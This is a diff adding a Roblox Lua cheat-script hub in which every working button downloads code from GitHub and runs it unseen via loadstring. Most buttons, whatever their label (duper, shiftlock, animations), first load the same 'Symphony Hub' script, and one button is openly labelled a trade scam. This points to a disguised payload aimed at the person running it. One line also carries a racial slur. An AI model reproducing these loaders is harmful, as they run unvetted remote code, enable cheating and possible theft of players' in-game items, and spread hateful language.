@@ -1,0 +1,68 @@
+local DrRayLibrary =
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+local window = DrRayLibrary:Load("Nico Hub👽🟢", "Default")
+local tab = DrRayLibrary.newTab("Scripts", "ImageIdHere")
+
+tab.newButton(
+    "MM2 TRADE SCAM V1🔥✅",
+    "Status: 🟢 Around 25 seconds to load but it's alr ^^",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2/main/Symphony%20Hub"))()
+    end
+)
+
+tab.newButton(
+    "MM2 DUPER🔥✅",
+    "Status: 🟢 2MINUTES TO LOAD ):<",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2/main/Symphony%20Hub"))()
+    end
+)
+
+tab.newButton(
+    "MM2 DUPER 2V🔥✅",
+    "Status: 🟢 2MINUTES TO LOAD! :D",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2/main/Symphony%20Hub"))()
+    end
+)
+
+tab.newButton(
+    "Chaotic Bladeball",
+    "Status: 🟢 Key: FuckNiggers",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/trashscript/main/chaotic.lua"))()
+    end
+)
+
+tab.newButton(
+    "Yarhm Hub🔥✅",
+    "Status: 🟢 This is Keyless! ^^",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2/main/Symphony%20Hub"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+    end
+)
+
+tab.newButton(
+    "Movable Shiftlock🔥✅",
+    "Status: 🟢 2MINUTES TO LOAD!",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2/main/Symphony%20Hub"))()
+        -- OPEN SOURCE 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Universal/Permanent-Shiftlock-V2'))()
+    end
+)
+
+tab.newButton(
+    "FE Animations🔥✅",
+    "Status: 🟢 2MINUTES TO LOAD!!",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2/main/Symphony%20Hub"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Animated/main/G", true))()
+    end
+)
+
+tab.newButton(
+    "NICO BYPASS 2024"
+)
